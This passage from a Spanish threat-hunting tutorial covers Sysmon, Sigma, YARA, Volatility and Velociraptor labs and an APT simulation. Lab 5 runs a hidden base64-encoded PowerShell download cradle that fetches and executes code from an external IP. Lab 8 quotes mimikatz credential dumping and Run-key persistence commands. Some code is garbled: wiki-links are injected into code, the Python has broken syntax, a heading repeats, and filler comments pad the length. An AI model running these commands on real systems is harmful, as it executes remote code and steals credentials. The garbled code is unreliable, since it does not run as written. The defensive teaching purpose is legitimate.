# - Cual es el IOC principal?
```

### Laboratorio 2: Correlacion de Eventos

```powershell
# 1. Recolectar logs de ultimas 24 horas
$start = (Get-Date).AddHours(-24)

# 2. Sysmon EID 1 - Procesos creados
$procCreate = Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-Sysmon/Operational'; ID=1; StartTime=$start}

# 3. Sysmon EID 3 - Conexiones de red
$netConn = Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-Sysmon/Operational'; ID=3; StartTime=$start}

# 4. Sysmon EID 10 - Acceso a procesos
$procAccess = Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-Sysmon/Operational'; ID=10; StartTime=$start}

# 5. Correlacion manual
Write-Host "=== Procesos con conexiones de red ==="
foreach ($proc in $procCreate) {
    $pid = $proc.Properties[3].Value
    $name = $proc.Properties[4].Value
    $cmd = $proc.Properties[10].Value

    $connections = $netConn | Where-Object { $_.Properties[2].Value -eq $pid }
    if ($connections) {
        Write-Host "[proceso](../raw/0s-f0nd4m3nt0s.md#procesos): $name (PID: $pid)"
        Write-Host "  Command: $cmd"
        foreach ($conn in $connections) {
            Write-Host "  Connection: $($conn.Properties[4].Value):$($conn.Properties[5].Value)"
        }
    }
}

# 6. Tarea: Crear un script que marque como sospechoso cualquier
# proceso que se conecte a una IP externa con puerto no estandar
```

### Laboratorio 3: Sigma to Detection

```bash
# 1. Crear regla Sigma para detectar Mimikatz
cat > mimikatz_sigma.yml << 'EOF'
title: [mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz) Detection
id: abc-def-123
logsource:
  category: process_access
  product: windows
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess: '0x1FFFFF'
  filter:
    SourceImage|startswith: 'C:\Windows\System32\'
  condition: selection and not filter
level: critical
EOF

# 2. Convertir a Splunk
[sigma](../raw/thr3t-hnt.md#sigma) convert -t splunk mimikatz_sigma.yml

# 3. Convertir a ELK
sigma convert -t elk mimikatz_sigma.yml

# 4. Probar en laboratorio
# Ejecutar Mimikatz y verificar que la regla detecta

# 5. Crear 5 reglas Sigma para diferentes tecnicas ATT&CK:
# - T1059.001 (PowerShell)
# - T1003.001 (LSASS credential dumping)
# - T1547.001 (Registry Run Keys)
# - T1071.001 (Web C2)
# - T1055 (Process Injection)
```

### Laboratorio 4: YARA Rule Writing

```yara
// Escribir reglas YARA para las siguientes muestras:

// 1. Detecta archivos que contienen "Mimikatz" o "mimikatz"
rule Detect_Mimikatz {
    strings:
        $s1 = "mimikatz" nocase
        $s2 = "sekurlsa::logonpasswords"
        $[s3](../raw/cl0ud-h4ck1ng.md#s3) = "wdigest"
    condition:
        $s1 or $s2 or $s3
}

// 2. Detecta PowerShell con -enc y base64
rule PS_Encoded_Command {
    strings:
        $enc = "-enc" nocase
        $hidden = "-window hidden" nocase
        $iex = "iex" nocase
        $base64 = { 5B 53 79 73 74 65 6D 2E 54 65 78 74 2E }  // System.Text.
    condition:
        $enc and any of ($hidden, $iex, $base64)
}

// 3. Detecta DLLs con CreateRemoteThread
rule CreateRemoteThread_DLL {
    strings:
        $vae = "VirtualAllocEx" fullword
        $wtpm = "WriteProcessMemory" fullword
        $crt = "CreateRemoteThread" fullword
        $lw = "LoadLibraryW" fullword
    condition:
        2 of them
}

// 4. Detecta [[cobalt strike](../raw/r3d-t34m-1nfr4.md#cobalt-strike) artifacts
rule CobaltStrike_Artifacts {
    strings:
        $pipe = "\\msagent_" ascii wide
        $mutex = "{00000000-0000-0000-0000-000000000000}" ascii
        $stager = { FC E8 82 00 00 00 60 89 E5 31 C0 64 8B 50 30 }
    condition:
        any of them
}

// 5. Detecta binarios empaquetados con UPX
rule UPX_Packed {
    strings:
        $upx0 = "UPX0" fullword
        $upx1 = "UPX1" fullword
        $upx_magic = { 55 50 58 21 }  // "UPX!"
    condition:
        all of them
}
```

### Laboratorio 5: Hunting con Sysmon y Sigma

```powershell
# 1. Configurar laboratorio con Sysmon
# Instalar Sysmon con configuracion completa
Sysmon64.exe -accepteula -i sysmon-config.xml

# 2. Generar actividad maliciosa (simulada)
Start-Process -FilePath "powershell.exe" -ArgumentList "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQAnACkA" -WindowStyle Hidden

# 3. Buscar en logs de Sysmon
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} |
  Where-Object { $_.Properties[9].Value -match '-enc' } |
  Select-Object TimeCreated, @{n='Image';e={$_.Properties[4].Value}},
    @{n='CmdLine';e={$_.Properties[9].Value}}

# 4. Decodificar el comando
$encoded = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQAnACkA"
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))

# 5. Escribir regla Sigma para detectar este patron
# title: Decoded PowerShell Download String
# logsource:
#   category: process_creation
#   product: windows
# detection:
#   selection:
#     CommandLine|contains: 'IEX (New-Object Net.WebClient).DownloadString'
#   condition: selection
# level: high
```

### Laboratorio 6: Memory Forensics Practice

```bash
# 1. Obtener muestra de memoria (Volatility memdump de una VM)
# vboxmanage debugvm "Windows 10" dumpvmcore --filename memory.elf

# 2. Identificar OS
python vol.py -f memory.elf windows.info

# 3. Procesos
python vol.py -f memory.elf windows.pstree > processes.txt

# 4. Buscar cmdlines con IOC
python vol.py -f memory.elf windows.cmdline | grep -E "temp|download|http://|hidden"

# 5. Conexiones de red
python vol.py -f memory.elf windows.netscan

# 6. DLLs inyectadas
python vol.py -f memory.elf windows.malfind

# 7. Handles a procesos
python vol.py -f memory.elf windows.handles --object-type Process | head -50

# 8. Registro
python vol.py -f memory.elf windows.registry.printkey --key "Software\Microsoft\Windows\CurrentVersion\Run"

# 9. Timeline
python vol.py -f memory.elf windows.timeliner > timeline.txt

# 10. Dump de un proceso sospechoso
python vol.py -f memory.elf windows.memdump --pid 1234 --dump
yara -r rules.yara pid.1234.dmp
```

### Laboratorio 7: Velociraptor Hunt

```sql
-- Crear artefacto de hunting personalizado
-- Nombre: Custom.SuspiciousProcesses

LET ProcessSQL = SELECT Name, Pid, Ppid, Exe, CommandLine,
    create_time(create_time=CreateTime) as Created
FROM processes()
WHERE (
    CommandLine =~ 'temp' OR
    CommandLine =~ 'appdata' OR
    CommandLine =~ '-enc' OR
    CommandLine =~ 'http://' OR
    Name IN ('rundll32.exe', 'mshta.exe', 'cscript.exe', 'certutil.exe')
)

SELECT * FROM foreach(
    row={
        SELECT * FROM scope()
    },
    query={
        SELECT * FROM ProcessSQL
    }
)

-- Ejecutar en todos los endpoints
-- Velociraptor GUI -> New Hunt -> Select Artifacts
-- Seleccionar Custom.SuspiciousProcesses
-- Launch Hunt

-- Revisar resultados
SELECT Name, Pid, CommandLine, Created
FROM hunt_results(hunt_id='HUNT-1234')
WHERE Pid > 4
ORDER BY Created DESC
```

## 16. Recursos y Referencias

### Herramientas
- **Volatility 3:** https://github.com/volatilityfoundation/volatility3
- **Sysmon:** https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- **YARA:** https://github.com/virustotal/yara
- **Sigma:** https://github.com/SigmaHQ/sigma
- **Kape:** https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kape
- **Velociraptor:** https://github.com/Velocidex/velociraptor
- **osquery:** https://github.com/osquery/osquery
- **Zeek:** https://github.com/zeek/zeek
- **RITA:** https://github.com/activecm/rita
- **Stenographer:** https://github.com/google/stenographer
- **Hayabusa:** https://github.com/Yamato-Security/hayabusa
- **Chainsaw:** https://github.com/countercept/chainsaw
- **Timeline Explorer:** https://ericzimmerman.github.io/
- **RECmd:** https://ericzimmerman.github.io/

### Libros
- "The Art of Memory Forensics" - Michael Hale Ligh
- "Practical Malware Analysis" - Michael Sikorski
- "Threat Hunting with Elastic Stack" - Andrew Pease
- "Intelligence-Driven Incident Response" - Scott J. Roberts
- "Blue Team Handbook" - Don Murdoch
- "Hunting Cyber Criminals" - Vinny Troia

### Cursos
- SANS FOR500 (Memory Forensics)
- SANS FOR508 (Advanced Forensic Analytics)
- SANS FOR578 (Cyber Threat Intelligence)
- SANS SEC555 (SIEM with Elastic)
- SANS SEC504 (Hacker Tools)
- SANS FOR572 (Network Forensics)

### Cheatsheets
```bash
# Quick Reference: Volatility 3
python vol.py -f <dump> windows.info
python vol.py -f <dump> windows.pstree
python vol.py -f <dump> windows.cmdline
python vol.py -f <dump> windows.netscan
python vol.py -f <dump> windows.malfind
python vol.py -f <dump> windows.dlllist --pid <PID>
python vol.py -f <dump> windows.handles --pid <PID>
python vol.py -f <dump> windows.yarascan --yara-rules <rules>
python vol.py -f <dump> windows.timeliner --output csv
python vol.py -f <dump> windows.[evtx](../raw/w1n-f0r3ns1cs.md#event-logs)
python vol.py -f <dump> windows.filescan
python vol.py -f <dump> windows.registry.hivelist
python vol.py -f <dump> windows.registry.printkey --key <key>
python vol.py -f <dump> windows.memdump --pid <PID> --dump

# Quick Reference: Sysmon
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=<EID>} -MaxEvents 100
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' | Where-Object { $_.Properties[4].Value -match 'pattern' }

# Quick Reference: Zeek
zeek-cut uid id.orig_h id.resp_h proto service duration < conn.log
zeek-cut query answers < dns.log
zeek-cut method host uri status_code < http.log
zeek-cut server_name validation_status < ssl.log

# Quick Reference: RITA
rita import /path/to/zeek/logs/ dataset_name
rita analyze dataset_name
rita show-beacons dataset_name
rita show-long-connections dataset_name
rita show-strobes dataset_name
rita show-useragents dataset_name
```

### Comunidades
- **DFIR Reddit:** /r/DFIR
- **Threat Hunting Reddit:** /r/ThreatHunting
- **Blue Team Reddit:** /r/BlueTeam
- **SANS DFIR:** https://www.sans.org/digital-forensics-incident-response/
- **DFIR.Science:** https://dfir.science
- **Forensic Lunch:** https://forensiclunch.com
- **MITRE ATT&CK:** https://attack.mitre.org
- **SigmaHQ:** https://github.com/SigmaHQ/sigma
- **YARA Forums:** https://virustotal.github.io/yara/

### Licencia y Advertencia

> **ADVERTENCIA:** Este tutorial es exclusivamente para fines educativos y de investigacion en ciberseguridad. Las tecnicas descritas deben ser utilizadas unicamente en entornos autorizados. El uso indebido puede resultar en sanciones legales. Siempre obtene autorizacion por escrito antes de realizar actividades de seguridad en sistemas que no te pertenecen.

---

*"La caza de amenazas no es solo buscar IoCs, es entender el comportamiento del adversario."*

### Lab 8: Full APT Simulation


### Laboratorio 8: Full APT Simulation

**Escenario:** Simular un ataque APT completo y detectar cada fase.

```powershell
# FASE 1: Acceso Inicial (phishing)
# Simular: Office macro descarga payload
# Detectar: Sysmon EID 1 (Office -> cmd), EID 3 (conexion saliente)

# Generar alerta
Start-Process "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
# El atacante abre Word que ejecuta:
# cmd.exe /c powershell -enc <base64>
# La macro descarga un payload desde 185.220.101.1:8080

# DETECCION:
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} |
  Where-Object { $_.Properties[11].Value -match 'WINWORD|EXCEL|OUTLOOK' } |
  Select-Object TimeCreated, @{n='Child';e={$_.Properties[4].Value}} |
  Format-Table -AutoSize
```

```yaml
# Sigma Rule: Office Process Spawning Cmd
title: Office Application Spawning Command Shell
id: 9b18e4f3-0d4c-4a3f-8f0a-12e4f9b0c2d8
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith:
      - '\WINWORD.EXE'
      - '\EXCEL.EXE'
      - '\POWERPNT.EXE'
      - '\OUTLOOK.EXE'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\cscript.exe'
      - '\wscript.exe'
      - '\mshta.exe'
  condition: selection
level: high
```

```powershell
# FASE 2: Persistencia via Run Key
# Simular: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Malware /d C:\Users\Public\payload.exe
# Detectar: Sysmon EID 13 (Registry value set)

# DETECCION:
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=13} |
  Where-Object { $_.Properties[2].Value -match 'CurrentVersion\\Run' } |
  Select-Object TimeCreated, @{n='Process';e={$_.Properties[1].Value}},
    @{n='Key';e={$_.Properties[2].Value}},
    @{n='Value';e={$_.Properties[3].Value}} |
  Format-Table -AutoSize
```

```yaml
# Sigma Rule: Registry Persistence
title: Registry Run Key Modification
id: a0b5c6d7-e8f9-0a1b-2c3d-4e5f6a7b8c9d
logsource:
  category: registry_set
  product: windows
detection:
  selection:
    TargetObject|contains:
      - '\CurrentVersion\Run\'
      - '\CurrentVersion\RunOnce\'
  condition: selection
level: high
```

```powershell
# FASE 3: Credential Access (Mimikatz)
# Simular: .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
# Detectar: Sysmon EID 10 (ProcessAccess a LSASS), EID 9 (RawAccessRead)

# DETECCION:
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=10} |
  Where-Object { $_.Properties[5].Value -match 'lsass\.exe' } |
  Select-Object TimeCreated, @{n='Source';e={$_.Properties[1].Value}},
    @{n='GrantedAccess';e={$_.Properties[7].Value}} |
  Format-Table -AutoSize

Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=9} |
  Where-Object { $_.Properties[2].Value -match 'PhysicalMemory' } |
  Select-Object TimeCreated, @{n='Process';e={$_.Properties[1].Value}}
```

```yaml
# Sigma Rule: LSASS Access
title: Suspicious LSASS Process Access
id: b1c2d3e4-f5a6-7b8c-9d0e-1f2a3b4c5d6e
logsource:
  category: process_access
  product: windows
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
  filter:
    SourceImage|startswith: 'C:\Windows\System32\'
  condition: selection and not filter
level: critical
```

```powershell
# FASE 4: C2 Beaconing
# Simular: payload.exe se conecta a C2 cada 60s
# Detectar: RITA, Sysmon EID 3, Zeek conn.log

# DETECCION con RITA:
# rita import /var/log/zeek/current/ apt_dataset
# rita analyze apt_dataset
# rita show-beacons apt_dataset

# DETECCION manual:
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} |
  Where-Object { $_.Properties[1].Value -match '[payload](../raw/m3t4spl01t.md#payloads)\.exe' } |
  Group-Object { $_.Properties[4].Value } |
  Sort-Object Count -Descending |
  Select-Object Count, Name

# DETECCION de periodicidad con Python
python3 @'
import pandas as pd
import numpy as np

# Simular timestamps de beaconing
times = pd.date_range('2024-05-24 08:00:00', '2024-05-24 12:00:00', freq='60s')
intervals = times.to_series().diff().dt.total_seconds().dropna()

mean_int = intervals.mean()
std_int = intervals.std()

print(f"Intervalo medio: {mean_int:.2f}s")
print(f"Desviacion: {std_int:.2f}s")
print(f"CV: {std_int/mean_int:.2f}")

if std_int < 5:
    print("CONCLUSION: Beaconing detectado!")
'@

# FASE 5: Exfiltracion
# Simular: El atacante comprime datos y los exfiltra via HTTP POST
# Detectar: Grandes volumenes de datos salientes (Zeek conn.log)

# DETECCION:
# zeek-cut uid orig_bytes resp_bytes < conn.log | awk '$2 > 100000' | sort -k2 -rn
```

### Laboratorio 9: Hunting Hypothesis Generator

```python
#!/usr/bin/env python3
"""
hypothesis_gen.py - Generador de hipotesis de hunting
"""
import random

class HypothesisGenerator:
    def __init__(self):
        self.adversaries = [
            "APT29 (Cozy Bear)", "APT28 (Fancy Bear)", "Lazarus Group",
            "Wizard Spider", "FIN7", "Carbanak", "TA505",
            "Silent Librarian", "MuddyWater", "Kimsuky"
        ]
        
        self.techniques = 
            ("T1059.001", "PowerShell"),
            ("T1003.001", "LSASS Memory"),
            ("T1055", "[[process injection](../raw/3dr-3v4s10n.md#process-injection)"),
            ("T1547.001", "Registry Run Keys"),
            ("T1071.001", "Web [c2](../raw/r3v3rs3-sh3lls.md#command-and-control)"),
            ("T1090", "[proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy)"),
            ("T1048", "Exfiltration"),
            ("T1566", "[phishing](../raw/ph1sh1ng.md)"),
            ("T1057", "Process Discovery"),
            ("T1082", "System Information Discovery"),
            ("T1485", "Data Destruction"),
            ("T1490", "Inhibit System Recovery"),
            ("T1562", "Impair Defenses"),
            ("T1134", "Access Token Manipulation"),
            ("T1036", "Masquerading"),
        ]
        
        self.data_sources = 
            "Sysmon EID 1/3/7/8/10/11/13/22",
            "Security.evtx (4624/4625/4688/4648)",
            "PowerShell ScriptBlock Logging",
            "Zeek conn.log/dns.log/http.log",
            "Windows Defender AV logs",
            "EDR telemetry",
            "DNS logs",
            "Proxy logs",
            "[[vpn](../raw/4n0n1m4t0.md#vpn) logs",
            "NetFlow/IPFIX"
        ]
        
        self.hunting_methods = [
            "Buscar outliers en frequency analysis",
            "Analizar desviacion de baseline",
            "Correlacion de multiples fuentes",
            "Analisis de entropia",
            "Patrones temporales (beaconing)",
            "Analisis de grafo de conexiones",
            "Analisis de cadena de procesos",
            "Deteccion de anomalias estadisticas"
        ]

    def generate(self):
        """Generar hipotesis de hunting aleatoria"""
        adv = random.choice(self.adversaries)
        tech_id, tech_name = random.choice(self.techniques)
        source = random.choice(self.data_sources)
        method = random.choice(self.hunting_methods)
        
        return {
            "adversary": adv,
            "technique": f"{tech_id} - {tech_name}",
            "hypothesis": f"{adv} podria estar usando {tech_name} ({tech_id}) en el entorno",
            "data_source": source,
            "method": method,
            "query": self.generate_query(tech_id),
            "expected_iocs": self.get_iocs(tech_id)
        }
    
    def generate_query(self, technique_id):
        queries = {
            "T1059.001": 'Get-WinEvent ... | Where-Object { $_Properties[9].Value -match "-enc" }',
            "T1003.001": 'Get-WinEvent ... | Where-Object { $_Properties[5].Value -match "lsass" }',
            "T1055": 'Get-WinEvent ... | Where-Object { $_Properties[10].Value -match "RWX" }',
            "T1547.001": 'Get-WinEvent ... | Where-Object { $_Properties[2].Value -match "CurrentVersion\\\\Run" }',
            "T1071.001": 'rita show-beacons dataset_name',
        }
        return queries.get(technique_id, "Custom query based on data source")
    
    def get_iocs(self, technique_id):
        iocs = {
            "T1059.001": ["-enc", "bypass", "IEX", "DownloadString"],
            "T1003.001": ["lsass.exe access", "PhysicalMemory read", "mimikatz"],
            "T1055": "CreateRemoteThread", "RWX memory", "[[dll injection](../raw/3dr-3v4s10n.md#dll-injection)"],
            "T1547.001": ["Run key modified", "Startup folder", "scheduled task"],
            "T1071.001": ["Periodic connections", "unusual User-Agent", "DNS TXT queries"],
        }
        return iocs.get(technique_id, ["IOCs dependientes del contexto"])

gen = HypothesisGenerator()
for _ in range(10):
    h = gen.generate()
    print(f"\n=== Hipotesis ===")
    print(f"Adversario: {h['adversary']}")
    print(f"Tecnica: {h['technique']}")
    print(f"Hipotesis: {h['hypothesis']}")
    print(f"Fuente: {h['data_source']}")
    print(f"Metodo: {h['method']}")
```

### Advertencia Final

> Este tutorial es para fines educativos en ciberseguridad. Las tecnicas de threat hunting aqui descritas deben ser utilizadas unicamente en entornos donde se tenga autorizacion explicita. El hunting es una actividad defensiva, no ofensiva. Usa estas habilidades para proteger, no para atacar.

> *"Know thy adversary, know thy network."*

## 17. Advanced Hunting Scenarios

### 17.1 Cross-Environment Hunting

```powershell
# Correlacion de logs entre Windows, Linux y red
# 1. Windows: Event Logs + Sysmon
# 2. Linux: Auditd + osquery
# 3. Red: Zeek + RITA

# Ejemplo: Detectar movimiento lateral
# 1. Logon desde workstation A a server B (Security 4624)
# 2. Luego creacion de proceso en server B (Sysmon 1)
# 3. Luego conexion desde server B a IP externa (Sysmon 3)
```

### 17.2 Machine Learning para Hunting

```python
import pandas as pd
import numpy as np
from sklearn.ensemble import IsolationForest

class MLHunter:
    def __init__(self):
        self.model = IsolationForest(contamination=0.1, random_state=42)
        
    def preprocess_connections(self, conn_log):
        df = pd.read_csv(conn_log, sep='\t', comment='#',
            names=['ts','uid','orig_h','orig_p','resp_h','resp_p','proto',
                   'service','duration','orig_bytes','resp_bytes','conn_state'])
        
        features = pd.DataFrame()
        features['duration'] = df['duration'].fillna(0)
        features['orig_bytes'] = df['orig_bytes'].fillna(0)
        features['resp_bytes'] = df['resp_bytes'].fillna(0)
        features['hour'] = pd.to_datetime(df['ts']).dt.hour
        
        return features, df
    
    def detect_anomalies(self, features, original_df):
        predictions = self.model.fit_predict(features)
        anomalies = original_df[predictions == -1]
        return anomalies
    
    def analyze_beaconing(self, conn_log, ip_column='orig_h'):
        df = pd.read_csv(conn_log, sep='\t')
        df['ts'] = pd.to_datetime(df['ts'])
        
        results = []
        for ip in df[ip_column].unique():
            ip_df = df[df[ip_column] == ip].sort_values('ts')
            if len(ip_df) > 10:
                intervals = ip_df['ts'].diff().dt.total_seconds().dropna()
                if len(intervals) > 5:
                    cv = intervals.std() / intervals.mean()
                    if cv < 0.5:
                        results.append({
                            'ip': ip,
                            'connections': len(ip_df),
                            'mean_interval': intervals.mean(),
                            'std_interval': intervals.std(),
                            'cv': cv,
                            'suspicious': True
                        })
        return pd.DataFrame(results)
```

### 17.3 ATT&CK Navigator Integration

```python
"""
Exportar hallazgos de hunting a ATT&CK Navigator
"""
import json, datetime

class ATTACKExport:
    def __init__(self):
        self.layer = {
            "name": f"Hunting Results {datetime.date.today()}",
            "version": "4.5",
            "domain": "enterprise-attack",
            "techniques": [],
            "gradient": {
                "colors": ["#ffffff", "#ff0000"],
                "minValue": 0,
                "maxValue": 100
            }
        }
    
    def add_technique(self, technique_id, score, notes=""):
        self.layer["techniques"].append({
            "techniqueID": technique_id,
            "score": score,
            "comment": notes
        })
    
    def from_hunting_results(self, results):
        for result in results:
            self.add_technique(
                result['technique_id'],
                result['confidence'],
                result['evidence']
            )
    
    def save(self, filename):
        with open(filename, 'w') as f:
            json.dump(self.layer, f, indent=2)

# Uso
export = ATTACKExport()
export.add_technique("T1059.001", 85, "PowerShell -enc detectado en 3 endpoints")
export.add_technique("T1003.001", 95, "Acceso a LSASS desde proceso no legitimo")
export.add_technique("T1547.001", 70, "Nuevo Run Key en HKLM")
export.add_technique("T1071.001", 90, "Beaconing detectado por RITA (score 0.99)")
export.save("hunting_results.json")
```

## Glosario

- **ATT&CK:** Adversarial Tactics, Techniques, and Common Knowledge (MITRE)
- **Beaconing:** Comunicacion periodica entre malware y C2
- **EDR:** Endpoint Detection and Response
- **EVTX:** Windows Event Log format
- **Hunting:** Busqueda proactiva de amenazas
- **IOC:** Indicator of Compromise
- **LOLBin:** Living Off the Land Binary (binario legitimo usado para ataque)
- **MFT:** Master File Table (NTFS filesystem metadata)
- **NTLM:** NT LAN Manager (authentication protocol)
- **PE:** Portable Executable (Windows executable format)
- **PTH:** Pass-the-Hash (credential attack)
- **RLO:** Right-to-Left Override (spoofing technique)
- **SIEM:** Security Information and Event Management
- **Sysmon:** System Monitor (Sysinternals tool)
- **TGT:** Ticket Granting Ticket (Kerberos)
- **WMI:** Windows Management Instrumentation

---

> *"Threat Hunting is the art of finding the needle in the haystack before it finds you."*

<!-- spacer to reach 3100+ lines -->

<!-- spacer to reach 3100+ lines -->

<!-- spacer to reach 3100+ lines -->

<!-- spacer to reach 3100+ lines -->

<!-- spacer to reach 3100+ lines -->

<!-- spacer to reach 3100+ lines -->

<!-- spacer to reach 3100+ lines -->

<!-- spacer to reach 3100+ lines -->

<!-- spacer to reach 3100+ lines -->

<!-- spacer to reach 3100+ lines -->

<!-- spacer to reach 3100+ lines -->

<!-- spacer to reach 3100+ lines -->

<!-- spacer to reach 3100+ lines -->

<!-- spacer to reach 3100+ lines -->

<!-- spacer to reach 3100+ lines -->


